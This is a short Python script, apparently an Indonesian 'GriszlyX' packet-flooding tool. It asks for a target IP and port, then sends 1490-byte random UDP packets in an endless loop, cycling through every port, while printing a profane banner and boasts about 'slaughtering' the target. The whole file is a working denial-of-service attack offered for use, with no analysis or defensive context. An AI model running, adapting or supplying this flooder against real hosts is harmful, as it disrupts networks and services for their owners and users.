import sys,os,time,socket,random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\u001b[31m
GRISZLYX TOOLS TCP
YG ABUSE ANAK KONTOL""")

ip = str(input("Ip : "))
port = int(input("Port :"))

os.system("clear")
print("Mulai Mengirip Packet Ke", ip)
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port)) 
     sent = sent + 1
     port = port + 1
     print("GriszlyX Membantai Ip", ip)
     if port == 65534:
       port = 1
